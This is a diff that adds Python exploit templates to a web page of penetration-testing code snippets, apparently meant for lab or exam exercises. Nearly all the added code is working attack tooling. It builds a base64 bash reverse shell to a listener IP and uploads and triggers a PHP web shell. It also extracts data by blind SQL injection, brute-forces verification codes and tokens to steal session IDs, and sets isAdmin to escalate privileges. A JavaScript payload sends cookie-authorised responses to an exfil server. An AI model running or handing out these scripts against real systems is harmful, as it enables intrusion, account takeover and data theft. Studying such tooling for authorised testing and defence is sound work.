@@ -194,6 +194,115 @@ permalink: /python-code-snippets/
             <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF etc.</li>
           </ul>
         </div>
+        <h3>Template: Get CSRF Token</h3>
+        <pre><code class="language-python">import re
+import requests
+
+def get_csrf_token(url, path, proxies=None):
+    response = requests.get(url + path, verify=False, proxies=proxies)
+    body = response.text
+    pattern = r'&lt;input\b[^&gt;]*\bvalue\s*=\s*\"([^"]*)\"[^&gt;]*&gt;'
+    matches = re.findall(pattern, body, re.DOTALL)
+    if matches:
+        csrf_token = matches[0].strip()
+        print(f"[+] Retrieved CSRF token: {csrf_token}")
+        return csrf_token
+    else:
+        print("[-] No CSRF token found.")
+        return None</code></pre>
+        <h3>Template: Login Brute Force (e.g., Verification Code)</h3>
+        <pre><code class="language-python">import re
+import requests
+
+def login_brute(url, username, password, csrf_token, code_file, proxies=None):
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    print("[+] Bruting verification codes...")
+    with open(code_file, "r") as f:
+        for code in f:
+            code = code.rstrip()
+            data = {
+                '_csrf': csrf_token,
+                'username': username,
+                'password': password,
+                'verification_code': code,
+                'submit': 'Submit',
+            }
+            r = requests.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=False)
+            if r.status_code == 302:
+                print(f"[+] Valid code: {code}")
+                # Extract session cookie
+                set_cookie = r.headers.get('Set-Cookie', '')
+                pattern = r'PHPSESSID=([^;]+)'
+                match = re.search(pattern, set_cookie)
+                if match:
+                    session_id = match.group(1).strip()
+                    print(f"[+] Session ID: {session_id}")
+                    return session_id
+    print("[-] No valid code found.")
+    return None</code></pre>
+        <h3>Template: Elevate to Admin via Profile Update</h3>
+        <pre><code class="language-python">import requests
+import json
+
+def elevate_to_admin(url, auth_token, username, proxies=None):
+    headers = {
+        'Content-Type': 'application/json',
+        'x-auth-token': auth_token
+    }
+    data = {
+        "email": f"{username}@example.com",
+        "username": username,
+        "isAdmin": "true"
+    }
+    r = requests.put(url, headers=headers, json=data, proxies=proxies)
+    if r.status_code == 200:
+        print(f"[+] User {username} elevated to admin.")
+        try:
+            json_data = json.loads(r.text)
+            new_token = json_data.get("token")
+            if new_token:
+                print(f"[+] New admin token: {new_token}")
+                return new_token
+        except json.JSONDecodeError:
+            print("[-] Response not valid JSON.")
+    print("[-] Elevation failed.")
+    return None</code></pre>
+        <h3>Template: Generate Magic Token and Brute</h3>
+        <pre><code class="language-python">import requests
+import re
+from email.utils import parsedate_to_datetime
+
+def generate_magic_token(url, username, proxies=None):
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = {'username': username}
+    # Send multiple requests to get timestamp range
+    r_first = requests.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
+    first_time = int(parsedate_to_datetime(r_first.headers.get('Date')).timestamp() * 1000)
+    # Simulate multiple requests...
+    r_last = requests.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
+    last_time = int(parsedate_to_datetime(r_last.headers.get('Date')).timestamp() * 1000)
+    print(f"[+] Timestamp range: {first_time} - {last_time}")
+    return first_time, last_time</code></pre>
+        <h3>Template: Token Brute Force</h3>
+        <pre><code class="language-python">import re
+import requests
+
+def token_brute(url, token_file, proxies=None):
+    print("[+] Bruting tokens...")
+    with open(token_file, "r") as f:
+        for token in f:
+            token = token.rstrip()
+            r = requests.get(f"{url}/{token}", proxies=proxies, allow_redirects=False)
+            if "Set-Cookie" in r.headers:
+                set_cookie = r.headers.get('Set-Cookie', '')
+                pattern = r'JSESSIONID=([^;]+)'
+                match = re.search(pattern, set_cookie)
+                if match:
+                    session_id = match.group(1).strip()
+                    print(f"[+] Valid session ID: {session_id}")
+                    return session_id
+    print("[-] No valid token found.")
+    return None</code></pre>
       </div>
 
       <div class="content-section" id="section-Remote-Code-Execution">
@@ -204,12 +313,136 @@ permalink: /python-code-snippets/
             <li>SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</li>
           </ul>
         </div>
+        <h3>Template: Generate Base64 Reverse Shell</h3>
+        <pre><code class="language-python">import base64
+
+def generate_b64revshell(listener_ip, listener_port, shell_type='bash'):
+    payload = f"{shell_type} -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
+    encoded = base64.b64encode(payload.encode()).decode()
+    print(f"[+] Generated payload: {encoded}")
+    return encoded</code></pre>
+        <h3>Template: Upload Malicious File</h3>
+        <pre><code class="language-python">import requests
+import random
+import string
+
+def upload_file(url, cookies, payload, headers=None, data=None, filename_ext='.php', proxies=None):
+    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + filename_ext
+    if headers is None:
+        headers = {'Content-Type': 'multipart/form-data; boundary=----boundary'}
+    multipart_data = f'------boundary\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\nContent-Type: image/jpeg\r\n\r\n{payload}\r\n------boundary--\r\n'
+    r = requests.post(url, headers=headers, cookies=cookies, data=multipart_data, proxies=proxies)
+    if r.status_code == 200:
+        print(f"[+] File {filename} uploaded successfully.")
+        return filename
+    else:
+        print("[-] Upload failed.")
+        return None</code></pre>
+        <h3>Template: Trigger Reverse Shell via Uploaded File</h3>
+        <pre><code class="language-python">import requests
+
+def trigger_rev_shell(url, filename, encoded_payload, proxies=None):
+    trigger_url = f"{url}/{filename}?cmd=echo '{encoded_payload}' | base64 -d | bash"
+    r = requests.get(trigger_url, proxies=proxies)
+    print("[+] Triggering reverse shell...")</code></pre>
+        <h3>Template: Upload Plugin (Zip)</h3>
+        <pre><code class="language-python">import requests
+
+def upload_plugin(url, auth_token, zip_filename, proxies=None):
+    headers = {'x-auth-token': auth_token}
+    with open(zip_filename, 'rb') as f:
+        files = {'zipFile': (zip_filename, f)}
+        r = requests.post(url, files=files, headers=headers, proxies=proxies)
+    if r.status_code == 200:
+        print("[+] Plugin uploaded successfully.")
+    else:
+        print("[-] Upload failed.")</code></pre>
+        <h3>Template: Update Preferences for Deserialization RCE</h3>
+        <pre><code class="language-python">import requests
+import json
+
+def update_preferences(url, auth_token, payload, user_id, proxies=None):
+    headers = {
+        'authorization': f'Bearer {auth_token}',
+        'Content-Type': 'application/json',
+    }
+    data = {
+        "email_notifications": "1",
+        "notification_frequency": payload  # Insecure deserialization payload
+    }
+    r = requests.post(f"{url}?user_id={user_id}", headers=headers, json=data, proxies=proxies)
+    if r.status_code == 200:
+        print("[+] Preferences updated for RCE.")</code></pre>
+        <h3>Template: Trigger Deserialization</h3>
+        <pre><code class="language-python">import requests
+
+def trigger_deserialization(url, auth_token, user_id, proxies=None):
+    headers = {'authorization': f'Bearer {auth_token}'}
+    r = requests.get(f"{url}?user_id={user_id}", headers=headers, proxies=proxies)
+    print("[+] Deserialization triggered.")</code></pre>
       </div>
 
       <div class="content-section" id="section-SQL-Injection">
         <h2 id="SQL-Injection">SQL Injection</h2>
-        <!-- Related content from concepts or other -->
         <p>Refer to Database Debug & Logging for enabling logs to identify SQLi points.</p>
+        <h3>Template: Blind SQL Injection (Threaded)</h3>
+        <pre><code class="language-python">import requests
+import string
+from concurrent.futures import ThreadPoolExecutor
+
+def blind_sqli(url_template, cookies, success_condition, charset=string.printable, position_start=1, proxies=None):
+    extracted = ''
+    position = position_start
+    while True:
+        found = None
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = []
+            for char in charset:
+                ascii_val = ord(char)
+                payload = f"1 AND (ascii(substr((select secret from table WHERE condition),{position},1)))={ascii_val}--"  # Adjust query
+                url = url_template.format(payload=payload)
+                future = executor.submit(requests.get, url, cookies=cookies, proxies=proxies, allow_redirects=False)
+                futures.append((future, char))
+            for future, char in futures:
+                r = future.result()
+                if success_condition in r.text:
+                    found = char
+                    break
+        if found:
+            extracted += found
+            print(f"\r[+] Extracted: {extracted}", end='', flush=True)
+            position += 1
+        else:
+            print("\n[-] Extraction complete.")
+            break
+    return extracted</code></pre>
+        <h3>Template: Blind SQLi via WebSocket</h3>
+        <pre><code class="language-python">import asyncio
+import websockets
+import string
+
+async def blind_sqli_ws(ws_url, auth_token, payload_template, success_condition, charset=string.printable, position_start=1):
+    extracted = ''
+    position = position_start
+    uri = f"ws://{ws_url}/socket.io/?EIO=3&transport=websocket"
+    async with websockets.connect(uri) as ws:
+        while True:
+            found = None
+            for char in charset:
+                ascii_val = ord(char)
+                payload = payload_template.format(position=position, ascii_val=ascii_val)
+                await ws.send(payload)
+                response = await asyncio.wait_for(ws.recv(), timeout=10.0)
+                if success_condition in response:
+                    found = char
+                    break
+            if found:
+                extracted += found
+                print(f"[+] Extracted: {extracted}", end='\r')
+                position += 1
+            else:
+                break
+    return extracted</code></pre>
       </div>
 
       <span id="XSS"></span>
@@ -308,11 +541,107 @@ function handleResponse() {
     changeReq.send('csrf='+token+'&param=value')  // Adjust params
 };</code></pre>
         </div>
+        <h3>Template: Send XSS Payload</h3>
+        <pre><code class="language-python">import requests
+
+def send_xss_payload(url, data_template, xss_payload, proxies=None):
+    data = data_template.copy()
+    data['description'] = xss_payload  # Adjust field
+    r = requests.post(url, data=data, proxies=proxies)
+    if r.status_code == 200:
+        print("[+] XSS payload sent.")
+    else:
+        print("[-] Failed to send XSS.")</code></pre>
+        <h3>Template: Create JS Payload for XSS Exfil</h3>
+        <pre><code class="language-python">def create_js_payload(exfil_url, exfil_endpoint, token_var='token'):
+    payload = f"""
+function getCookieValue(name) {{
+    const cookieString = document.cookie;
+    const cookies = cookieString.split('; ');
+    for (let cookie of cookies) {{
+        const [key, value] = cookie.split('=');
+        if (key === name) return value;
+    }}
+    return null;
+}}
+
+const cookieName = '{token_var}';
+const cookieValue = getCookieValue(cookieName);
+
+var req = new XMLHttpRequest();
+req.open('GET', '{exfil_url}/{exfil_endpoint}', false);
+req.setRequestHeader('authorization', 'Bearer ' + cookieValue);
+req.send();
+var response = req.responseText;
+
+var req2 = new XMLHttpRequest();
+req2.open('GET', '{exfil_url}/' + btoa(response), true);
+req2.send();
+    """
+    with open('./payload.js', 'w') as f:
+        f.write(payload)
+    print("[+] JS payload created.")</code></pre>
+        <h3>Template: Send XSS via WebSocket with Exfil</h3>
+        <pre><code class="language-python">import asyncio
+import websockets
+import socket
+import base64
+import json
+
+async def send_ws_xss(ws_url, auth_token, group_id, xss_payload, exfil_host, listener_port, proxies=None):
+    uri = f"ws://{ws_url}/send-message?token={auth_token}&group_id={group_id}"
+    async with websockets.connect(uri) as ws:
+        await ws.send(xss_payload)
+        print("[+] XSS sent via WS.")
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(('0.0.0.0', listener_port))
+        s.listen(5)
+        print(f"[+] Listening for exfil on {listener_port}...")
+        while True:
+            conn, addr = s.accept()
+            data = conn.recv(4096)
+            decoded = data.decode('utf-8', errors='ignore')
+            path = decoded.split()[1]
+            if path != '/payload.js':
+                try:
+                    exfil_data = json.loads(base64.b64decode(path.lstrip('/')).decode())
+                    # Extract relevant data
+                    print(f"[+] Exfiltrated data: {exfil_data}")
+                    return exfil_data.get('address'), exfil_data.get('group_id')
+                except Exception as e:
+                    print(f"[-] Exfil error: {e}")
+            # Serve payload.js if requested
+            with open('payload.js', 'rb') as f:
+                js = f.read()
+            resp = f"HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\nContent-Length: {len(js)}\r\n\r\n".encode() + js
+            conn.sendall(resp)</code></pre>
       </div>
 
       <div class="content-section" id="section-CSRF">
         <h2 id="CSRF">CSRF</h2>
         <p>See Leverage XSS to CSRF in XSS section for exploitation example.</p>
+        <h3>Template: Start Web Server for CSRF via XSS</h3>
+        <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
+import threading
+
+def start_web_server(csrf_payload, listener_ip='0.0.0.0', port=8000):
+    class MyHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path.endswith('/payload.js'):
+                self.send_response(200)
+                self.send_header("Content-Type", "application/javascript")
+                self.send_header("Content-Length", str(len(csrf_payload)))
+                self.end_headers()
+                self.wfile.write(csrf_payload.encode())
+
+    httpd = HTTPServer((listener_ip, port), MyHandler)
+    request_received = threading.Event()
+    def serve():
+        httpd.serve_forever()
+    threading.Thread(target=serve).start()
+    print(f"[+] Serving CSRF payload on port {port}.")
+    request_received.wait()  # Wait for trigger
+    httpd.shutdown()</code></pre>
       </div>
 
       <div class="content-section" id="section-File-Upload">
@@ -412,6 +741,16 @@ ois.setObjectInputFilter(filter);</code></pre>
       <div class="content-section" id="section-Application-Logic-Flaws">
         <h2 id="Application-Logic-Flaws">Application Logic Flaws</h2>
         <p>Refer to authentication bypass concepts.</p>
+        <h3>Template: Join Group (e.g., Admin/Secret)</h3>
+        <pre><code class="language-python">import requests
+
+def join_group(url, auth_token, group_address, proxies=None):
+    headers = {'authorization': f'Bearer {auth_token}'}
+    r = requests.post(f"{url}?address={group_address}", headers=headers, proxies=proxies)
+    if r.status_code == 200:
+        print(f"[+] Joined group {group_address}.")
+    else:
+        print("[-] Failed to join group.")</code></pre>
       </div>
 
       <div class="content-section" id="section-CORS">
@@ -602,6 +941,107 @@ def start_web_server(host='0.0.0.0', port=8000, directory='.', js_payload=None):
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
     return httpd</code></pre>
         </div>
+      </div>
+      <h3>Template: Get Attacker IP (e.g., tun0)</h3>
+        <pre><code class="language-python">import netifaces
+
+def get_attacker_ip(interface='tun0'):
+    try:
+        addresses = netifaces.ifaddresses(interface)
+        ip_info = addresses.get(netifaces.AF_INET)
+        if ip_info:
+            return ip_info[0]['addr']
+    except ValueError:
+        return None</code></pre>
+        <h3>Template: Register User</h3>
+        <pre><code class="language-python">import requests
+import random
+import string
+
+def register(url, headers=None, data_template=None, proxies=None):
+    username = ''.join(random.choices(string.ascii_letters, k=4))
+    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    if data_template is None:
+        data_template = {}
+    data = data_template.copy()
+    data['username'] = username
+    data['password'] = password
+    data['email'] = f"{username}@example.com"
+    r = requests.post(url, headers=headers, data=data, proxies=proxies)
+    if r.status_code in [200, 201, 302]:
+        print(f"[+] Registered {username}:{password}")
+        return username, password
+    else:
+        print("[-] Registration failed.")
+        return None, None</code></pre>
+        <h3>Template: Login User</h3>
+        <pre><code class="language-python">import requests
+import re
+
+def login(url, username, password, headers=None, data_template=None, proxies=None):
+    if data_template is None:
+        data_template = {}
+    data = data_template.copy()
+    data['username'] = username
+    data['password'] = password
+    r = requests.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
+    if r.status_code in [200, 302]:
+        print("[+] Login successful.")
+        # Extract session cookie
+        set_cookie = r.headers.get('Set-Cookie', '')
+        pattern = r'PHPSESSID=([^;]+)'  # Adjust for cookie name
+        match = re.search(pattern, set_cookie)
+        if match:
+            session_id = match.group(1).strip()
+            print(f"[+] Session ID: {session_id}")
+            return session_id
+    print("[-] Login failed.")
+    return None</code></pre>
+        <h3>Template: Get Local Flag</h3>
+        <pre><code class="language-python">import requests
+import re
+
+def get_local_flag(url, cookies, success_pattern, proxies=None):
+    r = requests.get(url, cookies=cookies, proxies=proxies)
+    matches = re.findall(success_pattern, r.text, re.DOTALL)
+    if matches:
+        flag = matches[0].strip()
+        print(f"[+] Local flag: {flag}")
+        return flag
+    else:
+        print("[-] No flag found.")
+        return None</code></pre>
+        <h3>Template: Register via WebSocket</h3>
+        <pre><code class="language-python">import asyncio
+import websockets
+import random
+import string
+
+async def register_ws(ws_url, data_template):
+    username = ''.join(random.choices(string.ascii_letters, k=4))
+    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    data = f'42["register",{data_template.format(username=username, password=password)}]'
+    uri = f"ws://{ws_url}/socket.io/?EIO=3&transport=websocket"
+    async with websockets.connect(uri) as ws:
+        await ws.send(data)
+        response = await ws.recv()
+        if 'success' in response:
+            print(f"[+] Registered {username}:{password} via WS.")
+            return username, password</code></pre>
+        <h3>Template: Login via WebSocket</h3>
+        <pre><code class="language-python">import asyncio
+import websockets
+
+async def login_ws(ws_url, username, password, data_template):
+    data = f'42["login",{data_template.format(username=username, password=password)}]'
+    uri = f"ws://{ws_url}/socket.io/?EIO=3&transport=websocket"
+    async with websockets.connect(uri) as ws:
+        await ws.send(data)
+        response = await ws.recv()
+        if 'token' in response:
+            token = response.split('"token":"')[1].split('"')[0]  # Adjust parsing
+            print(f"[+] Token: {token}")
+            return token</code></pre>
       </div>
 
       <span id="Bypass-Filters"></span>
